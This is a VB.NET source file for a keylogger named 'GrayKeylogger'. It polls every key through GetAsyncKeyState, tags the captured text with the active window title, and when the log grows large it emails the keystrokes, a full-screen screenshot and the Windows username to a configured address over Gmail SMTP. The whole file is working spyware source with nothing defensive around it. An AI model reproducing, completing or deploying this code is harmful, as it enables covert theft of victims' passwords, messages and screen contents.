Imports System.IO
Imports System.Net.Mail
Imports System.Windows.Forms
Imports System.Drawing
Imports System.Linq
Imports System.Runtime.InteropServices
Imports System.Text
Public Module GrayKeylogger
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
    <DllImport("user32.dll")>
    Private Function GetForegroundWindow() As IntPtr
    End Function
    <DllImport("user32.dll")>
    Private Function GetWindowText(ByVal hWnd As IntPtr, ByVal text As StringBuilder, ByVal count As Integer) As Integer
    End Function
    Public l As String = Nothing 
    Public c As String = Nothing
    Public Title As String = Nothing
    Public n = vbNewLine
    Public m As Boolean = IsKeyDown(Keys.Shift)
    Public Sub Main()
	    Try
            While True
                For i As Integer = 8 To 222
                    Select Case i
                        Case 8, 13, 32, 48 To 57, 65 To 90, 186 To 192, 219 To 222
                            If GetAsyncKeyState(i) = -32767 And Not IsKeyDown(Keys.Control) Then
                                l &= If(Title = GetWinTitle() And GetWinTitle() IsNot Nothing, Nothing, n & "[" & GetWinTitle() & "]" & n) & GiveKeyValue(i)
                                If l.Length >= logsize Then l = SendMail()
                                If GetWinTitle() <> Title Then Title = GetWinTitle()
                            End If
                    End Select
                Next
                Threading.Thread.Sleep(10)
            End While
	    Catch ex As Exception
             if	ErrorReporting Then msgbox(ex.message)
	    End Try	 
    End Sub
    Public Function IsKeyDown(Key As Keys) As Boolean
Return (Control.ModifierKeys And Key) = Key
    End Function
    Private Function GetWinTitle() As String
        Const nChars As Integer = 256
        Dim Buff As StringBuilder = New StringBuilder(nChars)
        Return If(GetWindowText(GetForegroundWindow(), Buff, nChars) > 0, Buff.ToString(), Nothing)
    End Function
    Function SendMail()
        TakeScreenshot(ScrPath)
        Using Attachment = New Attachment(ScrPath)
            Using Gmail As New MailMessage With {.Subject = Environ("username") & " [" & Date.Now & "]"}
                Gmail.To.Add(email)
                Gmail.From = New MailAddress(email)
                Gmail.Body = l
                Gmail.Attachments.Add(Attachment)
                Using Smtp As New SmtpClient("smtp.Gmail.com") With {.Credentials = New Net.NetworkCredential(email, Password), .Port = 587, .EnableSsl = True}
                    Smtp.Send(Gmail)
                End Using
            End Using
        End Using
        Return Nothing
    End Function
    Sub TakeScreenshot(path As String)
        Dim Bounds As Rectangle = Screen.GetBounds(Point.Empty)
        Using bitmap As Bitmap = New Bitmap(Bounds.Width, Bounds.Height)
            Using g As Graphics = Graphics.FromImage(bitmap)
                g.CopyFromScreen(Point.Empty, Point.Empty, Bounds.Size)
            End Using
            bitmap.Save(path, Imaging.ImageCodecInfo.GetImageEncoders().First(Function(c) c.FormatID = Imaging.ImageFormat.Jpeg.Guid), New Imaging.EncoderParameters() With {.Param = {New Imaging.EncoderParameter(Imaging.Encoder.Quality, ScrQuality)}})
        End Using
    End Sub
    Function GiveKeyValue(i As Integer) As String
        c = Nothing
        m = IsKeyDown(Keys.Shift)
        If i > 64 And i < 91 Then c = If(Control.IsKeyLocked(Keys.CapsLock) Or m, Chr(i).ToString.ToUpper, Chr(i).ToString.ToLower) 
        If i = 8 Then c = "[BACK]"
        If i = 13 Then c = n
        If i = 32 Then c = " "
        If i = 48 Then c = If(m, ")", "0")
        If i = 49 Then c = If(m, "!", "1")
        If i = 50 Then c = If(m, "@", "2")
        If i = 51 Then c = If(m, "#", "3")
        If i = 52 Then c = If(m, "$", "4")
        If i = 53 Then c = If(m, "%", "5")
        If i = 54 Then c = If(m, "^", "6")
        If i = 55 Then c = If(m, "&", "7")
        If i = 56 Then c = If(m, "*", "8")
        If i = 57 Then c = If(m, "(", "9")
        If i = 186 Then c = If(m, ":", ";")
        If i = 187 Then c = If(m, "+", "=")
        If i = 188 Then c = If(m, "<", ",")
        If i = 189 Then c = If(m, "_", "-")
        If i = 190 Then c = If(m, ">", ".")
        If i = 191 Then c = If(m, "?", "/")
        If i = 192 Then c = If(m, "~", "`")
        If i = 219 Then c = If(m, "{", "[")
        If i = 220 Then c = If(m, "|", "\")
        If i = 221 Then c = If(m, "}", "]")
        If i = 222 Then c = If(m, """", "'")
        Return c
    End Function
End Module